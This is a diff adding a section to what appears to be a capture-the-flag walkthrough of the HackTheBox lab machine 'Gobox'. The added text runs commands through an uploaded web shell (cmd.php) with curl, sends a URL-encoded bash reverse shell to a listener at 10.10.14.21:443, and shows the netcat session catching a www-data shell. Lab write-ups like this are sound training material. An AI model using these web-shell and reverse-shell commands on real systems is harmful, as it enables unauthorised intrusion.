@@ -353,7 +353,7 @@ Upload it:
 
 <br />
 
-
+![18](../../../assets/images/Gobox/18.png)
 
 <br />
 
@@ -362,8 +362,55 @@ Execute a command:
 <br />
 
 ```bash
-
+❯ curl -s -X GET "http://10.10.11.113/cmd.php" -G -d '0=whoami'
+www-data
 ```
 
 <br />
 
+Check if we are in the `main` system:
+
+<br />
+
+```bash
+❯ curl -s -X GET "http://10.10.11.113/cmd.php" -G -d '0=hostname%20-I'
+10.10.11.113 172.17.0.1 172.28.0.1 dead:beef::250:56ff:fe94:c055
+```
+
+<br />
+
+To gain access to it, we run a `reverse shell`:
+
+<br />
+
+```bash
+❯ curl -s -X GET "http://10.10.11.113/cmd.php" -G -d '0=bash%20-c%20"bash%20-i%20>%26%20/dev/tcp/10.10.14.21/443%200>%261"'
+```
+
+<br />
+
+Check the listener and...
+
+<br />
+
+```bash
+❯ sudo nc -nlvp 443
+[sudo] contraseña para theredp4nther: 
+listening on [any] 443 ...
+connect to [10.10.14.21] from (UNKNOWN) [10.10.11.113] 56828
+bash: cannot set terminal process group (796): Inappropriate ioctl for device
+bash: no job control in this shell
+www-data@gobox:/opt/website$ id        
+id
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+```
+
+<br />
+
+We're in! Intrusion ready, come on with the privilege escalation.
+
+<br />
+
+# Privilege Escalation: www-data -> root
+
+<br />
